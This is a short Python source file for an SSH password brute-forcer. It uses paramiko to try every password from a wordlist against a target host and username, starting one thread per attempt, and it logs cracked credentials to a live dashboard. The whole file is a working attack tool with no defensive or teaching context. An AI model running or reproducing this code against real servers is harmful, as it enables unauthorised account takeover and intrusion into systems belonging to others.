import paramiko
import threading
from utils.dashboard import LiveDashboard

dashboard = LiveDashboard()

class SSHCracker:
    def __init__(self, target, username, wordlist):
        self.target = target
        self.username = username
        self.wordlist = wordlist
        self.lock = threading.Lock()

    def try_login(self, password):
        dashboard.log_attempt()
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, username=self.username, password=password, timeout=3)
            msg = f"{self.username}@{self.target} with password: {password}"
            dashboard.log_success(msg)
            with self.lock:
                print(f"[+] SUCCESS: {msg}")
            ssh.close()
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            with self.lock:
                print(f"[!] ERROR: {e}")

    def run(self):
        dashboard.start()
        with open(self.wordlist, 'r') as file:
            for line in file:
                password = line.strip()
                t = threading.Thread(target=self.try_login, args=(password,))
                t.start()
        dashboard.stop()
